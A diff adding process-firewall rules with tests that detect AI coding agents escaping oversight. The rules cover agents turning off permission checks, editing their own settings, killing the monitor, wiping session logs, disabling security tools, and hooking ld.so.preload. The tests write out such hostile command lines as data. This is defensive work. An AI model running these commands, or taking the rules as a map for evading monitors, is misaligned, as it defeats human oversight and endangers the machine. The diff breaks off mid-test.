@@ -216,3 +216,857 @@ rules:
       - name: a list of the cron jobs stays quiet
         expect: allow
         process: { pid: 982, comm: crontab, exe: /usr/bin/crontab, argv: [crontab, -l] }
+
+  # Agent self-harm: the agent takes away the protection that watches it.
+
+  - id: process.agent.bypass-flag
+    title: An agent starts an agent with the permission check off
+    category: agent-behavior
+    risk: blocked
+    decision: deny
+    reason: An agent starts a second agent and takes the permission check away with a flag. The second agent then changes files, keys and servers without a question. Only a person may make this choice.
+    match:
+      action: exec
+      program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush, npx, pnpm, bunx, uvx, sh, bash, zsh, dash, env, sudo, timeout, xargs]
+      ancestor_program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush, pi]
+      all_of:
+        - argv_matches: '(?:^|\s|/)(?:claude|claude-code|codex|gemini|copilot|opencode|aider|cursor-agent|goose|qwen|crush)(?:\s|$)'
+        - argv_matches: '(?:^|\s)(?:--dangerously-skip-permissions|--dangerously-bypass-approvals-and-sandbox|--yolo|--trust-all-tools|--approve-all|--auto-approve|--full-auto|--auto-edit|--permission-mode[= ]bypassPermissions|--sandbox[= ]danger-full-access)(?:\s|$)'
+    tests:
+      - name: an agent that starts an agent without permission checks is refused
+        expect: deny
+        process: { pid: 1000, comm: claude, exe: /usr/local/bin/claude, argv: [claude, --dangerously-skip-permissions, -p, "fix the failing tests"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a sandbox flag that opens the whole machine is refused
+        expect: deny
+        process: { pid: 1001, comm: codex, exe: /usr/local/bin/codex, argv: [codex, --sandbox, danger-full-access, exec, "ship it"] }
+        ancestry: [{ comm: node }, { comm: codex }]
+      - name: a person who starts the agent in a terminal stays quiet
+        expect: allow
+        process: { pid: 1002, comm: claude, exe: /usr/local/bin/claude, argv: [claude, --dangerously-skip-permissions] }
+        ancestry: [{ comm: bash }]
+      - name: a build command under an agent stays quiet
+        expect: allow
+        process: { pid: 1003, comm: npm, exe: /usr/bin/npm, argv: [npm, run, build] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a second agent without a bypass flag stays quiet here
+        expect: allow
+        process: { pid: 1004, comm: claude, exe: /usr/local/bin/claude, argv: [claude, -p, "fix the failing tests"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+
+  - id: process.agent.guardrail-config
+    title: An agent writes its own permission settings
+    category: agent-behavior
+    risk: approval_required
+    decision: approval_required
+    reason: The command changes the file that says what the agent may do. A change here takes the check away for this session and for every session after it.
+    match:
+      any_of:
+        - all_of:
+            - action: exec
+              program: [tee, sed, jq, cp, mv, install, truncate, dd, ln, shred, rm]
+              ancestor_program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush, pi]
+            - argv_matches: '(?:^|\s|/|=)(?:\.claude/settings[^\s/]*\.json|\.codex/config\.toml|\.gemini/settings\.json|\.aider\.conf\.yml|managed-settings\.json|(?:\.config|etc)/agent-firewall/[^\s]*\.ya?ml)'
+        - all_of:
+            - action: exec
+              program: [sh, bash, zsh, dash, ksh, fish, sudo, python, python3, node, perl, busybox]
+              ancestor_program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush, pi]
+            - argv_matches: '(?:^|\s|/|=)(?:\.claude/settings[^\s/]*\.json|\.codex/config\.toml|\.gemini/settings\.json|\.aider\.conf\.yml|managed-settings\.json|(?:\.config|etc)/agent-firewall/[^\s]*\.ya?ml)'
+            - argv_matches: '>>?|(?:^|\s)(?:tee|jq|install|truncate|shred)(?:\s|$)|(?:^|\s)sed\s+[^|]*-i|(?:^|\s)(?:rm|mv|cp)(?:\s|$)|open\([^)]*[wa]'
+        - all_of:
+            - action: input
+            - input_matches: '(?:^|\s|/|=)(?:\.claude/settings[^\s/]*\.json|\.codex/config\.toml|\.gemini/settings\.json|managed-settings\.json|(?:\.config|etc)/agent-firewall/[^\s]*\.ya?ml)'
+            - input_matches: '>>?|(?:^|\s)(?:tee|jq|install|truncate|shred)(?:\s|$)|(?:^|\s)sed\s+[^|]*-i'
+    tests:
+      - name: an agent that adds a permission to its own settings needs approval
+        expect: approval_required
+        process: { pid: 1010, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "jq '.permissions.allow += [\"Bash(*)\"]' .claude/settings.local.json > .claude/settings.local.json"], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: an agent that overwrites the rules of the firewall needs approval
+        expect: approval_required
+        process: { pid: 1011, comm: tee, exe: /usr/bin/tee, argv: [tee, /home/dev/.config/agent-firewall/process.yaml] }
+        ancestry: [{ comm: bash }, { comm: codex }]
+      - name: an agent that reads the settings stays quiet
+        expect: allow
+        process: { pid: 1012, comm: cat, exe: /usr/bin/cat, argv: [cat, .claude/settings.json], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: an agent that writes a build log stays quiet
+        expect: allow
+        process: { pid: 1013, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "npm run build > build.log"], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a person who edits the settings without an agent stays quiet
+        expect: allow
+        process: { pid: 1014, comm: sed, exe: /usr/bin/sed, argv: [sed, -i, "s/ask/allow/", .claude/settings.json], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }]
+
+  - id: process.security.tooling-disable
+    title: Security tooling stopped, switched off or removed
+    category: security
+    risk: approval_required
+    decision: approval_required
+    reason: The command stops or removes a program that watches this machine for attacks. After it, nothing records what happens, and no later report can bring that record back.
+    match:
+      action: exec
+      program: [systemctl, launchctl, service, spctl, setenforce, csrutil, aa-teardown, apt, apt-get, dnf, yum, zypper, snap, brew, dpkg, pkill, killall, kill, sudo, doas, sh, bash, zsh, busybox]
+      any_of:
+        - all_of:
+            - argv_matches: '(?:^|\s)(?:stop|disable|mask|unload|bootout|remove|purge|erase|uninstall|autoremove|--purge)(?:\s|$)|(?:^|\s)(?:pkill|killall)(?:\s|$)'
+            - argv_matches: '(?i)(?:^|\s|/)(?:auditd|falco|clamav|clamd|clamav-daemon|freshclam|fail2ban|apparmor|osqueryd?|wazuh(?:-agent)?|falcon-sensor|crowdstrike|sentinelone|sentinelagent|mdatp|carbonblack|cbagent|snort|suricata|tripwire|rkhunter|aide|sysmon|auditbeat|agent-firewall|afw-monitor)(?:[\s.@]|$)'
+        - argv_matches: '(?:^|\s)spctl\s+--(?:master|global)-disable(?:\s|$)'
+        - argv_matches: '(?:^|\s)setenforce\s+0(?:\s|$)'
+        - argv_matches: '(?:^|\s)csrutil\s+disable(?:\s|$)'
+        - argv_matches: '(?:^|\s)aa-teardown(?:\s|$)'
+    tests:
+      - name: switching the audit service off needs approval
+        expect: approval_required
+        process: { pid: 1020, comm: sudo, exe: /usr/bin/sudo, argv: [sudo, systemctl, disable, --now, auditd] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: removing the virus scanner needs approval
+        expect: approval_required
+        process: { pid: 1021, comm: apt-get, exe: /usr/bin/apt-get, argv: [apt-get, remove, -y, clamav, fail2ban] }
+      - name: killing the security daemon needs approval
+        expect: approval_required
+        process: { pid: 1022, comm: pkill, exe: /usr/bin/pkill, argv: [pkill, -f, falco] }
+      - name: switching the macOS program check off needs approval
+        expect: approval_required
+        process: { pid: 1023, comm: sudo, exe: /usr/bin/sudo, argv: [sudo, spctl, --master-disable] }
+      - name: a restart of the web server stays quiet
+        expect: allow
+        process: { pid: 1024, comm: sudo, exe: /usr/bin/sudo, argv: [sudo, systemctl, restart, nginx] }
+      - name: removing a normal library stays quiet
+        expect: allow
+        process: { pid: 1025, comm: apt-get, exe: /usr/bin/apt-get, argv: [apt-get, remove, -y, libssl-dev] }
+      - name: stopping the own application stays quiet
+        expect: allow
+        process: { pid: 1026, comm: systemctl, exe: /usr/bin/systemctl, argv: [systemctl, stop, my-app.service] }
+
+  - id: process.signal.supervision
+    title: Signal to the firewall or to the agent that runs the work
+    category: process
+    risk: blocked
+    decision: deny
+    reason: The command stops the firewall or the agent that runs this session. It ends the watch over every later command, and it stops the work of other sessions with it.
+    match:
+      action: exec
+      program: [kill, pkill, killall, sudo, doas, sh, bash, zsh, dash, busybox, xargs, timeout]
+      any_of:
+        - all_of:
+            - argv_matches: '(?:^|\s)(?:kill|pkill|killall)(?:\s|$)'
+            - argv_matches: '(?:^|\s|/|")(?:agent-firewall|afw-monitor|fw-monitor)(?:\s|"|$)'
+        - all_of:
+            - ancestor_program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush, pi]
+            - argv_matches: '(?:^|\s)(?:kill|pkill|killall)(?:\s|$)'
+            - argv_matches: '(?:^|\s|/|")(?:claude|claude-code|codex|gemini|copilot|opencode|aider|cursor-agent|goose|qwen|crush)(?:\s|"|$)|\$(?:PPID|\{PPID\})'
+    tests:
+      - name: a signal to the firewall is refused
+        expect: deny
+        process: { pid: 1030, comm: pkill, exe: /usr/bin/pkill, argv: [pkill, -f, agent-firewall] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: an agent that stops its own agent is refused
+        expect: deny
+        process: { pid: 1031, comm: pkill, exe: /usr/bin/pkill, argv: [pkill, -f, claude] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: an agent that signals its own parent is refused
+        expect: deny
+        process: { pid: 1032, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "kill -9 $PPID"] }
+        ancestry: [{ comm: bash }, { comm: codex }]
+      - name: a signal to the own development server stays quiet
+        expect: allow
+        process: { pid: 1033, comm: pkill, exe: /usr/bin/pkill, argv: [pkill, -f, my-dev-server] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a signal to a shell job stays quiet
+        expect: allow
+        process: { pid: 1034, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "kill %1"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a person who stops a stuck agent in a terminal stays quiet
+        expect: allow
+        process: { pid: 1035, comm: pkill, exe: /usr/bin/pkill, argv: [pkill, -f, claude] }
+        ancestry: [{ comm: bash }]
+
+  - id: process.agent.state-wipe
+    title: Delete or overwrite of the session record of the agent
+    category: agent-behavior
+    risk: approval_required
+    decision: approval_required
+    reason: The command deletes the session records of the agent. The record of the work, and often the sign-in data with it, is gone. No backup and no git command brings it back.
+    match:
+      action: exec
+      program: [rm, shred, truncate, mv, find, sh, bash, zsh, dash, ksh, sudo, busybox, xargs]
+      ancestor_program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush, pi]
+      any_of:
+        - all_of:
+            - argv_matches: '(?:^|\s)(?:rm|shred|truncate|mv)(?:\s|$)'
+            - argv_matches: '(?:^|\s|/)\.(?:claude|codex|gemini|copilot|opencode|aider|cursor)/'
+        - all_of:
+            - argv_matches: '>\s*\S*(?:^|/)\.(?:claude|codex|gemini|copilot|opencode)/'
+        - argv_matches: '(?:^|\s)(?:rm|shred|truncate)\s+[^|]*(?:\.bash_history|\.zsh_history|\.python_history)(?:\s|$)'
+        - argv_matches: '(?:^|;|\s)history\s+-c(?:\s|$)'
+    tests:
+      - name: a delete of the session records needs approval
+        expect: approval_required
+        process: { pid: 1040, comm: rm, exe: /usr/bin/rm, argv: [rm, -rf, "/home/dev/.claude/projects/3f2a"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: an empty write over a session file needs approval
+        expect: approval_required
+        process: { pid: 1041, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "> /home/dev/.codex/sessions/abc123.jsonl"] }
+        ancestry: [{ comm: bash }, { comm: codex }]
+      - name: a delete of the shell history needs approval
+        expect: approval_required
+        process: { pid: 1042, comm: rm, exe: /usr/bin/rm, argv: [rm, -f, "/home/dev/.bash_history"] }
+        ancestry: [{ comm: bash }, { comm: gemini }]
+      - name: a delete of the build output stays quiet
+        expect: allow
+        process: { pid: 1043, comm: rm, exe: /usr/bin/rm, argv: [rm, -rf, node_modules], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a delete of a package cache stays quiet
+        expect: allow
+        process: { pid: 1044, comm: rm, exe: /usr/bin/rm, argv: [rm, -rf, "/home/dev/.cache/uv"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+
+  - id: process.system.disable-protection
+    title: Write to a system switch that stops the protection
+    category: process
+    risk: blocked
+    decision: deny
+    reason: The command writes to a system switch that protects the whole machine. It loads a library into every program, or it takes the right to watch processes away, and then the firewall sees nothing. No development task needs this write.
+    match:
+      any_of:
+        - all_of:
+            - action: exec
+            - argv_matches: '/etc/ld\.so\.preload|/proc/sys/kernel/yama/ptrace_scope|/proc/sysrq-trigger'
+            - argv_matches: '>>?|(?:^|\s)(?:tee|cp|mv|dd|install|truncate|ln|shred|sed)(?:\s|$)'
+        - action: exec
+          argv_matches: '(?:^|\s)sysctl\s+(?:-w\s+)?kernel\.yama\.ptrace_scope\s*=\s*0(?:\s|$)'
+        - all_of:
+            - action: input
+            - input_matches: '/etc/ld\.so\.preload|/proc/sys/kernel/yama/ptrace_scope|/proc/sysrq-trigger'
+            - input_matches: '>>?|(?:^|\s)(?:tee|cp|mv|dd|install|truncate|ln|shred|sed)(?:\s|$)'
+    tests:
+      - name: a write to the preload list is refused
+        expect: deny
+        process: { pid: 1050, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "echo /var/tmp/hook.so > /etc/ld.so.preload"] }
+      - name: a write to the preload list from a script is refused
+        expect: deny
+        process: { pid: 1051, comm: bash, exe: /usr/bin/bash }
+        input: { source: file, data: "#!/bin/sh\ncp /var/tmp/hook.so /usr/lib/hook.so\necho /usr/lib/hook.so | tee /etc/ld.so.preload\n" }
+      - name: taking the right to watch processes away is refused
+        expect: deny
+        process: { pid: 1054, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "echo 0 > /proc/sys/kernel/yama/ptrace_scope"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: the same switch through sysctl is refused
+        expect: deny
+        process: { pid: 1055, comm: sudo, exe: /usr/bin/sudo, argv: [sudo, sysctl, -w, "kernel.yama.ptrace_scope=0"] }
+      - name: a read of the preload list stays quiet
+        expect: allow
+        process: { pid: 1052, comm: cat, exe: /usr/bin/cat, argv: [cat, /etc/ld.so.preload] }
+      - name: another system setting for a build stays quiet
+        expect: allow
+        process: { pid: 1056, comm: sudo, exe: /usr/bin/sudo, argv: [sudo, sysctl, -w, "vm.max_map_count=262144"] }
+      - name: a line for the shell profile stays quiet
+        expect: allow
+        process: { pid: 1053, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "echo 'export PATH=$PATH:~/bin' >> ~/.bashrc"] }
+
+  - id: process.exec.fileless
+    title: Program that has no file on the disk
+    category: process
+    risk: approval_required
+    decision: approval_required
+    reason: The program runs from memory or from a file that is already deleted. Nobody can read the code afterwards, and no scanner can check it.
+    match:
+      action: exec
+      any_of:
+        - exe_glob: ["/memfd:*", "/proc/self/fd/*", "/proc/*/fd/*", "/dev/fd/*"]
+        - exe_glob: ["* (deleted)", "*/* (deleted)", "**/* (deleted)"]
+    tests:
+      - name: a program from memory needs approval
+        expect: approval_required
+        process: { pid: 1060, comm: polygone, exe: "/memfd:polygone (deleted)", argv: [polygone] }
+      - name: a program from a file descriptor needs approval
+        expect: approval_required
+        process: { pid: 1061, comm: sh, exe: /proc/self/fd/3, argv: [sh] }
+      - name: a program whose file is deleted needs approval
+        expect: approval_required
+        process: { pid: 1062, comm: tox, exe: "/home/dev/app/tox (deleted)", argv: ["./tox"] }
+      - name: a normal program stays quiet
+        expect: allow
+        process: { pid: 1063, comm: python3, exe: /usr/bin/python3, argv: [python3, -m, venv, .venv] }
+      - name: a program from the project stays quiet
+        expect: allow
+        process: { pid: 1064, comm: app, exe: /home/dev/app/target/debug/app, argv: ["./target/debug/app"] }
+
+  - id: process.package.publish
+    title: Publication of a package to a registry
+    category: supply-chain
+    risk: approval_required
+    decision: approval_required
+    reason: An agent or an install script sends a package to a public registry, where other people install it. A published version stays public, and no command takes it back.
+    match:
+      action: exec
+      program: [npm, pnpm, yarn, bun, twine, cargo, gem, dotnet, gh, poetry, flit, hatch, uv, sudo, sh, bash, zsh, npx]
+      ancestor_program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush, pi, npm, pnpm, yarn, bun, pip, pip3, uv, cargo, gem]
+      any_of:
+        - all_of:
+            - argv_matches: '(?:^|\s)(?:npm|pnpm|yarn|bun)(?:\s|$)'
+            - argv_matches: '(?:^|\s)publish(?:\s|$)'
+            - argv_not_matches: '(?:^|\s)run(?:\s|$)'
+        - argv_matches: '(?:^|\s)twine\s+upload(?:\s|$)'
+        - argv_matches: '(?:^|\s)cargo\s+publish(?:\s|$)'
+        - argv_matches: '(?:^|\s)gem\s+push(?:\s|$)'
+        - argv_matches: '(?:^|\s)dotnet\s+nuget\s+push(?:\s|$)'
+        - argv_matches: '(?:^|\s)gh\s+release\s+create(?:\s|$)'
+        - argv_matches: '(?:^|\s)(?:poetry|flit|hatch|uv)\s+publish(?:\s|$)'
+    exceptions:
+      - argv_any: ["--dry-run", "--dry_run"]
+    tests:
+      - name: a publication to the npm registry needs approval
+        expect: approval_required
+        process: { pid: 1070, comm: npm, exe: /usr/bin/npm, argv: [npm, publish, --access, public], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a publication to the python registry needs approval
+        expect: approval_required
+        process: { pid: 1071, comm: twine, exe: /usr/bin/twine, argv: [twine, upload, "dist/*"], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: codex }]
+      - name: a publication from an install script needs approval
+        expect: approval_required
+        process: { pid: 1076, comm: npm, exe: /usr/bin/npm, argv: [npm, publish], cwd: /home/dev/app/node_modules/pkg }
+        ancestry: [{ comm: node }, { comm: npm }, { comm: bash }]
+      - name: a release on the code host needs approval
+        expect: approval_required
+        process: { pid: 1072, comm: gh, exe: /usr/bin/gh, argv: [gh, release, create, v1.2.0], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a trial run of the publication stays quiet
+        expect: allow
+        process: { pid: 1073, comm: npm, exe: /usr/bin/npm, argv: [npm, publish, --dry-run], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a publication that a person starts stays quiet
+        expect: allow
+        process: { pid: 1077, comm: npm, exe: /usr/bin/npm, argv: [npm, publish], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }]
+      - name: a build stays quiet
+        expect: allow
+        process: { pid: 1074, comm: npm, exe: /usr/bin/npm, argv: [npm, run, build], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: an install stays quiet
+        expect: allow
+        process: { pid: 1075, comm: npm, exe: /usr/bin/npm, argv: [npm, install], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+
+  # Report only: the firewall writes a note and the work continues.
+
+  - id: process.agent.nested-session
+    title: An agent starts a second agent
+    category: agent-behavior
+    risk: suspicious
+    decision: allow
+    reason: An agent starts a second agent. The second agent uses the same keys, but no person reads its questions, so nobody sees what it decides.
+    match:
+      action: exec
+      ancestor_program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush, pi]
+      any_of:
+        - program: [claude, claude-code, codex, gemini, copilot, opencode, aider, cursor-agent, goose, qwen, crush]
+        - all_of:
+            - program: [npx, pnpx, bunx, uvx, pipx, pnpm, yarn]
+            - argv_matches: '(?:^|\s|/)(?:claude|claude-code|codex|gemini|copilot|opencode|aider|cursor-agent|goose|qwen|crush)(?:\s|$)'
+    tests:
+      - name: an agent under an agent is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1100, comm: claude, exe: /usr/local/bin/claude, argv: [claude, -p, "fix the failing tests"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: an agent that a package runner starts is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1102, comm: npx, exe: /usr/bin/npx, argv: [npx, codex, exec, "ship it"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: an agent that a person starts stays quiet
+        expect: allow
+        process: { pid: 1101, comm: claude, exe: /usr/local/bin/claude, argv: [claude, -p, "fix the failing tests"] }
+        ancestry: [{ comm: bash }]
+      - name: a package runner for a build tool stays quiet
+        expect: allow
+        process: { pid: 1103, comm: npx, exe: /usr/bin/npx, argv: [npx, tsc, --noEmit], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+
+  - id: process.signal.broad-pattern
+    title: Signal to every process of a shared program
+    category: process
+    risk: suspicious
+    decision: allow
+    reason: The command stops every process with this program name. It also stops the servers, the language servers and the builds of the user, and not only the process that the agent means.
+    match:
+      action: exec
+      program: [pkill, killall, sudo, doas, sh, bash, zsh, busybox, xargs]
+      all_of:
+        - argv_matches: '(?:^|\s)(?:pkill|killall)(?:\s|$)'
+        - argv_matches: '(?:^|\s)(?:node|python|python3|java|ruby|deno|bun|go|rustc|cargo|dotnet|php|perl|code|ssh|docker|containerd|postgres|mysqld|redis-server|chrome|chromedriver|firefox|nginx)$'
+    tests:
+      - name: a signal to every node process is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1110, comm: pkill, exe: /usr/bin/pkill, argv: [pkill, -f, node] }
+        ancestry: [{ comm: bash }, { comm: cursor-agent }]
+      - name: a signal to two shared runtimes is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1111, comm: killall, exe: /usr/bin/killall, argv: [killall, "-9", node, python] }
+      - name: a signal to the own development server stays quiet
+        expect: allow
+        process: { pid: 1112, comm: pkill, exe: /usr/bin/pkill, argv: [pkill, -f, my-dev-server] }
+      - name: a signal to one named script stays quiet
+        expect: allow
+        process: { pid: 1113, comm: pkill, exe: /usr/bin/pkill, argv: [pkill, -f, "node server.js"] }
+
+  - id: process.detach.background-job
+    title: Work that continues after the session
+    category: process
+    risk: suspicious
+    decision: allow
+    reason: The command puts the work outside the session. The work continues when the session ends, and a stop button does not reach it.
+    match:
+      action: exec
+      program: [nohup, setsid, daemonize, tmux, screen, dtach, systemd-run, sh, bash, zsh, dash, busybox]
+      any_of:
+        - argv_matches: '(?:^|\s)(?:nohup|setsid|daemonize|disown)(?:\s|$)'
+        - argv_matches: '(?:^|\s)tmux\s+new(?:-session)?\b[^|]*\s-d(?:\s|$)'
+        - argv_matches: '(?:^|\s)screen\s+-[a-zA-Z]*d[a-zA-Z]*m'
+        - argv_matches: '(?:^|\s)systemd-run\b'
+        - argv_matches: '>\s*/dev/null[^|]*&\s*$'
+    tests:
+      - name: a detached job is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1120, comm: nohup, exe: /usr/bin/nohup, argv: [nohup, ./long-audit.sh] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a background line that hides its output is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1121, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "./worker.py >/dev/null 2>&1 &"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a detached terminal session is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1122, comm: tmux, exe: /usr/bin/tmux, argv: [tmux, new-session, -d, -s, job, "make test-all"] }
+      - name: a normal build stays quiet
+        expect: allow
+        process: { pid: 1123, comm: make, exe: /usr/bin/make, argv: [make, "-j8"] }
+      - name: a test run in the foreground stays quiet
+        expect: allow
+        process: { pid: 1124, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "pytest -x > report.txt"] }
+
+  - id: process.agent.self-update
+    title: An agent installs or updates its own program
+    category: agent-behavior
+    risk: suspicious
+    decision: allow
+    reason: The agent replaces the program that runs it. A wrong or broken version stays on the machine, and every later session trusts it.
+    match:
+      action: exec
+      program: [npm, pnpm, yarn, bun, npx, brew, pipx, uv, pip, pip3, claude, claude-code, codex, gemini, copilot, opencode, aider, goose, sh, bash, zsh, sudo]
+      any_of:
+        - all_of:
+            - argv_matches: '(?:^|\s)(?:install|add|update|upgrade|reinstall)(?:\s|$)'
+            - argv_matches: '(?:^|\s|/|=)(?:@anthropic-ai/claude-code|@openai/codex|@google/gemini-cli|@github/copilot|claude-code|opencode-ai|aider-chat|cursor-agent|goose-ai)(?:@\S+)?(?:\s|$)'
+        - argv_matches: '(?:^|\s)(?:claude|codex|gemini|copilot|opencode|aider|goose)\s+(?:update|upgrade|self-update)(?:\s|$)'
+    tests:
+      - name: an agent that updates its own package is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1130, comm: npm, exe: /usr/bin/npm, argv: [npm, install, "-g", "@anthropic-ai/claude-code@latest"] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: the update command of the agent is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1131, comm: claude, exe: /usr/local/bin/claude, argv: [claude, update] }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a normal global install stays quiet
+        expect: allow
+        process: { pid: 1132, comm: npm, exe: /usr/bin/npm, argv: [npm, install, "-g", typescript] }
+      - name: a plain install stays quiet
+        expect: allow
+        process: { pid: 1133, comm: npm, exe: /usr/bin/npm, argv: [npm, install] }
+
+  - id: process.loader.preload-env
+    title: Command that loads an extra library into a program
+    category: process
+    risk: suspicious
+    decision: allow
+    reason: The command names a library that the system loads into the program before its own code. Code from that library sees and changes everything the program does.
+    match:
+      any_of:
+        - all_of:
+            - action: exec
+            - argv_matches: '(?:^|\s)(?:LD_PRELOAD|LD_AUDIT|GLIBC_TUNABLES|DYLD_INSERT_LIBRARIES)='
+            - argv_not_matches: '(?:^|\s)(?:LD_PRELOAD|LD_AUDIT|DYLD_INSERT_LIBRARIES)=/(?:usr/)?lib'
+        - all_of:
+            - action: input
+            - input_matches: '(?:^|\s)(?:LD_PRELOAD|LD_AUDIT|GLIBC_TUNABLES|DYLD_INSERT_LIBRARIES)='
+            - input_matches: '(?:^|\s)(?:LD_PRELOAD|LD_AUDIT|DYLD_INSERT_LIBRARIES)=(?:\./|\S*/tmp/|\S*/\.cache/)'
+    tests:
+      - name: a library from the project directory is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1140, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "LD_PRELOAD=./hook.so npm test"], cwd: /home/dev/app }
+        ancestry: [{ comm: bash }, { comm: claude }]
+      - name: a library that a script loads is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1141, comm: sh, exe: /usr/bin/sh }
+        input: { source: file, data: "#!/bin/sh\nLD_PRELOAD=/var/tmp/hook.so python3 app.py\n" }
+      - name: a system library stays quiet
+        expect: allow
+        process: { pid: 1142, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "LD_PRELOAD=/usr/lib/libfaketime.so ./app"] }
+      - name: a normal build stays quiet
+        expect: allow
+        process: { pid: 1143, comm: make, exe: /usr/bin/make, argv: [make, "-j8"] }
+
+  - id: process.exec.name-masquerade
+    title: Program that uses the name of a known tool
+    category: evasion
+    risk: suspicious
+    decision: allow
+    reason: The program shows the name of a known tool, but its file is not the file of that tool. A person who reads the name sees the wrong program.
+    match:
+      any_of:
+        - all_of:
+            - action: exec
+              program: [git, ssh, sudo, curl, wget, kubectl, docker, gh, npm, node, python, python3, sh, bash]
+              exe_glob: ["**/node_modules/.bin/*", "**/.git/hooks/*", "**/.venv/bin/git", "**/.venv/bin/ssh"]
+        - action: exec
+          argv_matches: '(?:^|\s)exec\s+-a\s+\S+'
+        - action: input
+          input_matches: '(?:^|\s)exec\s+-a\s+\S+'
+    tests:
+      - name: a system tool from the package directory is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1150, comm: git, exe: /home/dev/app/node_modules/.bin/git, argv: [git, push], cwd: /home/dev/app }
+      - name: a new name for a program is reported
+        expect: allow
+        expect_match: true
+        process: { pid: 1151, comm: bash, exe: /usr/bin/bash, argv: [bash, -c, "exec -a npm /var/tmp/payload install"] }
+      - name: a normal git stays quiet
+        expect: allow
+        process: { pid: 1152, comm: git, exe: /usr/bin/git, argv: [git, push], cwd: /home/dev/app }
+      - name: a tool of the project stays quiet
+        expect: allow
+        process: { pid: 1153, comm: eslint, exe: /home/dev/app/node_modules/.bin/eslint, argv: [eslint, "."], cwd: /home/dev/app }
+
+  - id: process.encoded.decoder-chain
+    title: Text that another decoder turns into commands
+    category: process
+    risk: suspicious
+    decision: allow
+    reason: The command decodes text and sends the result straight to an interpreter. The real commands are not readable in the line.
+    match:
+      any_of:
+        - action: exec
+          argv_matches: '(?i)(?:\bbase32\s+-d|\bxxd\s+-r|\bgunzip\b|\bzcat\b|\bbunzip2\b|\bbzcat\b|\bxz\s+-d\b|\bunzip\s+-p\b|\btar\s+xO|\bprintf\s+[^|]*\\x[0-9a-f]{2}|\brev\b|\btr\s+[^|]*A-Za-z)[^|]*\|\s*(?:sudo\s+)?(?:\S*/)?(?:sh|bash|zsh|dash|ksh|python3?|perl|ruby|node)(?:\s+-\S+)*\s*$'
+        - action: input
+          input_matches: '(?i)(?:\bbase32\s+-d|\bxxd\s+-r|\bgunzip\b|\bzcat\b|\bbunzip2\b|\bbzcat\b|\bxz\s+-d\b|\bunzip\s+-p\b|\btar\s+xO|\bprintf\s+[^|]*\\x[0-9a-f]{2})[^|]*\|\s*(?:sudo\s+)?(?:\S*/)?(?:sh|bash|zsh|dash|ksh|python3?|perl|ruby|node)(?:\s+-\S+)*\s*$'
+    tests:
+      - name: text in another alphabet that goes into a shell is reported
+        expect: allow
+        expect_match: true
